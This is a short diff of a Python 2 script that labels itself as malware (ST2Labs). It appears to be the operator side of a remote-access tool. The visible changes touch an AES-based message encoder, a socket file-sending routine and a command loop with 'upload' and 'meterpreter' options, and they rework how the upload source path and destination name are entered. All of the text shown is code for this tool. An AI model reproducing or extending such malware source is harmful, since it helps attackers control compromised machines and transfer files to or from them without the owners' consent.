@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 """
     @Malware
     ST2Labs / GEO SYSTEM SOFTWARE
@@ -158,8 +159,9 @@ def encodeCipher(aes, data):
     return base64.b64encode(encryp_msg)
 
 #Sent File Method
-def sent(con, file):
-    f = open(file,'rb')
+def sent(con, fileName):
+    f = open(fileName,'rb')
+    print f
     print 'Sending...'
     l = f.read(1024)
     while (l):
@@ -202,8 +204,9 @@ def main():
                 if cmd:
                     if cmd == 'upload':
                         req_str = option(con, aes, cmd)
-                        fileName = raw_input("¿Cuál es el nombre del fichero?: ")
-                        req_str = option(con, aes, fileName)
+                        fileName = raw_input("¿Cual es la ruta del fichero?: ")
+                        fileDest = raw_input("¿Cual es el nombre que quiere que tenga en el destino (indique ext): ")
+                        req_str = option(con, aes, fileDest)
                         sent(con, fileName)
                     if code == "1" and cmd == "meterpreter":
                         cmd = meterpreter()
